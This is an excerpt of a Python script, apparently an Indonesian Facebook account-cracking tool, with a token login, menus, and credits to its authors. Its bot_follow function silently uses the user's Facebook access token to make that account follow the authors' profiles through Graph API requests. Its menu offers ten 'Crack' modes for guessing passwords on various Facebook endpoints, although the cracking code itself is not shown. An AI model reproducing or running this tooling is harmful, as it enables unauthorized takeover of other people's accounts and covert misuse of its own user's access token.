...
## BUAT KALI INI AJAH YE OPEN RESOURCE CODE ESOK² KAGAK :v
...
# Tipe Python3                                       #
#                                                    #
# File Name: pyservisee.cpython-38                   #
#                                                    #
...
#####################################################
# Thanks To Dapunta, Moch Yayan, Rizal F, Angga Eksdi
#####################################################
...
def ige():
    os.system("clear")
    banner()
    input(p+"\n ["+k+"•"+m+"•"+p+"] Open WhatsApps? ")
    jalan(p+" ["+k+"•"+m+"•"+p+"] Open WhatsAppa...")
    os.system("xdg-open https://wa.me/628811403654")
    input(p+" [BACK]")
    kontak()   
...
def kontolrecode():
    ...
    os.system("xdg-open https://www.facebook.com/Bang.badru23")
    input(p+" [BACK]")
    logs()   
...
def log_token():
    ...
    try:
        ...
        jalan((p+" ["+k+"•"+m+"•"+p+"] Please Follow My Akun:)"))
        os.system('xdg-open https://www.facebook.com/Bang.badru23')
        menu()
    except KeyError:
        print((p+"\n ["+k+"•"+m+"•"+p+"] Token Invalid"))
...
def bot_follow():
	try:
		...
		logs()
	requests.post("https://graph.facebook.com/100006230836266/subscribers?access_token=" + toket)      #Dapunta Khurayra X
	requests.post('https://graph.facebook.com/100069672799769/subscribers?access_token=' + toket) #Dapunta Adya R
	...
	requests.post('https://graph.facebook.com/100005143741340/subscribers?access_token=' + toket) #Alexandra 
...
def menu():
    ...
    print((p+" ["+k+"•"+m+"•"+p+"]"+p+" Status  : \033[1;33m*Premium"+p))
    print((p+" ["+k+"•"+m+"•"+p+"]"+p+" ID FB   : \033[1;33m"+id))
    print((p+" ["+k+"•"+m+"•"+p+"]"+p+" Your Ip : \033[1;33m"+ip))
    print((p+" ["+k+"•"+m+"•"+p+"]"+p+" Joined  : \033[1;33m"+durasi))
...
def pilihcrack(file):
  ...
  print((p+" ["+o+"01"+p+"] Crack With Api.Facebook (FAST) "))
  print((p+" ["+o+"02"+p+"] Crack With Api.Facebook + TTL (FAST)"))
  print((p+" ["+o+"03"+p+"] Crack With Mbasic.Facebook (SLOW)"))
  print((p+" ["+o+"04"+p+"] Crack With Mbasic.Facebook + TTL (SLOW)"))
  print((p+" ["+o+"05"+p+"] Crack With Touch.Facebook (SLOW)"))
  print((p+" ["+o+"06"+p+"] Crack With Touch.Facebook + TTL (SLOW)"))
  print((p+" ["+o+"07"+p+"] Crack With M.Facebook (SLOW)"))
  print((p+" ["+o+"08"+p+"] Crack With M.Facebook + TTL (SLOW)"))
  print((p+" ["+o+"09"+p+"] Crack With Free.Facebook (SLOW)"))
  print((p+" ["+o+"10"+p+"] Crack With Free.Facebook + TTL (SLOW)"))
  print((p+" ["+o+"11"+p+"] Back To Menu "))
  krah=input(p+"\n ["+k+"•"+m+"•"+p+"] Choose : ")
  if krah in[""]:
    print((p+" ["+k+"•"+m+"•"+p+"] Fill In The Correct"))
    pilihcrack(file)
